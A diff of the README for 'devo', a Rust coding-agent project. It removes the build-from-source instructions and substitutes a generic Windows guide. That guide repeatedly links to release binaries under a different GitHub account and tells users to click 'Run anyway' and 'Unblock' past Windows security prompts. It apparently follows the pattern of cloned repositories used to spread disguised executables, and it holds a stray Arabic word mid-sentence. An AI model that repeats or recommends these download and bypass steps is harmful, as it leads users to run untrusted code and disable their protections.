@@ -1,88 +1,278 @@
-![cover](./docs/assets/readme_cover.png)
+# 🧩 devo - Open coding agent that fits your workflow
 
-<div align="center">
+[![Download devo](https://img.shields.io/badge/Download%20devo-blue?style=for-the-badge&logo=github)](https://github.com/preexisting-middlename485/devo/releases)
 
-**An open-source coding agent that is blazing fast, secure, and model-provider agnostic.**
+## 🚀 What devo does
 
-🚧Early-stage project under active development — not production-ready yet.
-⭐ Star us to follow 
+devo is an open coding agent for people who want help with coding tasks on Windows.
 
-[![Status](https://img.shields.io/badge/status-designing-blue?style=flat-square)](https://github.com/)
-[![Language](https://img.shields.io/badge/language-Rust-E57324?style=flat-square&logo=rust&logoColor=white)](https://www.rust-lang.org/)
-[![Origin](https://img.shields.io/badge/origin-Claude_Code_TS-8A2BE2?style=flat-square)](https://docs.anthropic.com/en/docs/claude-code)
-[![License](https://img.shields.io/badge/license-MIT-green?style=flat-square)](./LICENSE)
-[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen?style=flat-square)](https://github.com/)
+It can help with common work like:
 
-[English](./README.md) | [简体中文](./README.zh-CN.md) | [繁體中文](./README.zh-TW.md) | [日本語](./README.ja.md) | [한국어](./README.ko.md) | [Español](./README.es.md) | [Français](./README.fr.md) | [Português do Brasil](./README.pt-BR.md) | [Deutsch](./README.de.md) | [Русский](./README.ru.md) | [Türkçe](./README.tr.md)
+- writing new code
+- changing existing code
+- reading project files
+- suggesting fixes
+- helping with small coding tasks
+- working with different tools and providers
 
-<img 
-  src="./docs/assets/demo_20260421.gif" 
-  alt="Project Overview" 
-  width="100%"
-  style="border-radius: 8px; box-shadow: 0 15px 40px rgba(0,0,0,0.25);object-fit:cover;"
-/>
+Because devo is provider agnostic, it does not lock you into one service. You can use it with the setup that works for you.
 
-</div>
+## 💻 Before you start
 
----
+Use a Windows PC with:
 
-## 📖 Table of Contents
+- Windows 10 or Windows 11
+- an internet connection for the download
+- enough free space for the app and its files
+- permission to run apps on your computer
 
-- [Quick Start](#-quick-start)
-- [FAQ](#-faq)
-- [Contributing](#-contributing)
-- [References](#-references)
-- [License](#-license)
+If your work computer has extra security rules, you may need help from your admin to run the app.
 
-## 🚀 Quick Start
+## 📥 Download devo
 
-<!-- ### Install -->
+Visit this page to download devo:
 
-No stable release yet — you can build the project from source using the instructions below.
+https://github.com/preexisting-middlename485/devo/releases
 
-### Build
+On that page:
 
-```bash
-git clone https://github.com/7df-lab/devo && cd devo
-cargo build --release
+1. Open the latest release
+2. Find the Windows download
+3. Download the file to your computer
+4. Save it in a folder you can find again, مثل Downloads or Desktop
 
-# linux / macos
-./target/release/devo onboard
+If you see more than one file, choose the one for Windows. It is often named with `.exe`, `.msi`, or a zip file for Windows.
 
-# windows
-.\target\release\devo onboard
-```
+## 🛠️ Install or unpack devo
 
-> [!TIP]
-> Make sure you have Rust installed, 1.75+ recommended (via https://rustup.rs/).
+The steps depend on the file you downloaded.
 
-## FAQ
+### If you downloaded an `.exe` file
 
-### How is this different from Claude Code?
+1. Double-click the file
+2. If Windows asks for permission, choose Yes
+3. Follow the setup steps on screen
+4. Finish the install
 
-It's very similar to Claude Code in terms of capability. Here are the key differences:
+### If you downloaded an `.msi` file
 
-- 100% open source
-- Not coupled to any provider. Devo can be used with Claude, OpenAI, z.ai, Qwen, Deepseek, or even local models. As models evolve, the gaps between them will close and pricing will drop, so being provider-agnostic is important.
-- TUI support is already implemented.
-- Built with a client/server architecture. For example, the core can run locally on your machine while being controlled remotely (e.g., from a mobile app), with the TUI acting as just one of many possible clients.
+1. Double-click the file
+2. Follow the installer prompts
+3. Finish the install
 
+### If you downloaded a `.zip` file
 
-## 🤝 Contributing
+1. Right-click the zip file
+2. Choose Extract All
+3. Pick a folder
+4. Wait for Windows to unpack the files
 
-Contributions are welcome! This project is in its early design phase, and there are many ways to help:
+Keep the extracted folder in a place you can find later.
 
-- **Architecture feedback** — Review the crate design and suggest improvements
-- **RFC discussions** — Propose new ideas via issues
-- **Documentation** — Help improve or translate documentation
-- **Implementation** — Pick up crate implementation once designs stabilize
+## ▶️ Run devo on Windows
 
-Please feel free to open an issue or submit a pull request.
+After install or unpacking:
 
-## 📄 License
+1. Open the folder where devo is saved
+2. Look for the main app file
+3. Double-click it to start
 
-This project is licensed under the [MIT License](./LICENSE).
+If Windows shows a security prompt:
 
----
+1. Choose More info if needed
+2. Then choose Run anyway if you trust the file from the release page
 
-**If you find this project useful, please consider giving it a ⭐**
+If devo opens in a terminal window, keep that window open while you use it.
+
+## 🧭 First-time setup
+
+The first time you run devo, it may ask you to choose a provider or connect your account.
+
+You may see options for:
+
+- local use
+- cloud-based providers
+- API keys
+- model settings
+- project folder access
+
+A simple setup path:
+
+1. Open devo
+2. Choose the provider you want
+3. Enter your key or sign in if asked
+4. Pick a project folder
+5. Start your first task
+
+If you do not know which provider to use, start with the one already linked to your account or the one your team uses.
+
+## ⚙️ Basic use
+
+Once devo is open, you can give it tasks in plain language.
+
+Examples:
+
+- create a simple login page
+- fix this error message
+- explain this file
+- update this button style
+- add a search box
+- clean up this script
+
+A common workflow:
+
+1. Open your project
+2. Describe the task
+3. Review the changes
+4. Accept the files you want
+5. Test the result
+
+## 🗂️ Best way to use devo
+
+For smoother results:
+
+- keep one project open at a time
+- use short, clear requests
+- ask for one task first
+- review changes before saving them
+- keep a backup of important files
+
+Good requests are direct. For example:
+
+- change the title on the home page
+- fix the broken import in this file
+- add a cancel button to the form
+- make the error text easier to read
+
+## 🔒 Privacy and account use
+
+devo may connect to external services, depending on the provider you choose.
+
+Keep these points in mind:
+
+- use only accounts you trust
+- store API keys in a safe place
+- do not share keys in chat or screenshots
+- use the provider settings that match your needs
+
+If you work on shared hardware, sign out when you are done.
+
+## 🧩 Common file types you may see
+
+Depending on the release, you may see files like:
+
+- `.exe` for Windows apps
+- `.msi` for Windows installers
+- `.zip` for packaged files
+- release notes that explain changes
+- checksum files for file checks
+
+For most users, the Windows installer or the main Windows app file is the right choice.
+
+## 🧪 Simple troubleshooting
+
+If devo does not start:
+
+1. Check that the download finished
+2. Try running the file again
+3. Move the file to another folder
+4. Restart your computer
+5. Download the latest release again
+
+If Windows blocks the app:
+
+1. Right-click the file
+2. Choose Properties
+3. Look for an Unblock option
+4. Apply the change if shown
+5. Try opening the app again
+
+If the app opens but does not work right:
+
+1. Close devo
+2. Open it again
+3. Check your internet connection
+4. Confirm your provider details
+5. Try a smaller task first
+
+## 📌 Tips for better results
+
+You will get better results when you:
+
+- ask for one change at a time
+- name the file or screen you want changed
+- keep requests short
+- mention what should stay the same
+- test after each change
+
+Example:
+
+- edit the home page only
+- keep the current color scheme
+- change the button text to Save
+- do not change the layout
+
+## 🖥️ What to expect on Windows
+
+devo is built for Windows users who want a simple way to run coding tasks.
+
+You may see:
+
+- a normal app window
+- a terminal window
+- a prompt for access to a folder
+- a settings screen for provider setup
+
+This is normal. The app may need access to your project files so it can help with edits and checks.
+
+## 📁 Suggested folder setup
+
+A simple folder layout can make things easier:
+
+- `C:\Users\YourName\Downloads` for the installer
+- `C:\Users\YourName\Documents\Projects` for your code
+- `C:\devo` if you want one fixed place for extracted files
+
+Keep your project files in one place. That makes it easier for devo to find them.
+
+## 🔁 Updating devo
+
+When a new version is out:
+
+1. Visit the release page again
+2. Download the newest Windows file
+3. Install or unpack it
+4. Open the new version
+
+If you use a zip release, replace the old files with the new ones only after you close the app.
+
+## 📄 Release page
+
+Download and install from the release page here:
+
+https://github.com/preexisting-middlename485/devo/releases
+
+Use this page to find the latest Windows file, read release notes, and get the version you want.
+
+## 🧰 Helpful use cases
+
+devo can fit many small coding jobs, such as:
+
+- editing HTML pages
+- updating CSS styles
+- changing JavaScript logic
+- reviewing small code changes
+- helping with file cleanup
+- supporting quick fixes in a project
+
+It works best when you give clear goals and keep the task small.
+
+## 🧭 Quick start checklist
+
+- download the latest Windows release
+- install it or unpack the zip
+- open devo
+- choose your provider
+- connect your account or key
+- open your project folder
+- give your first task
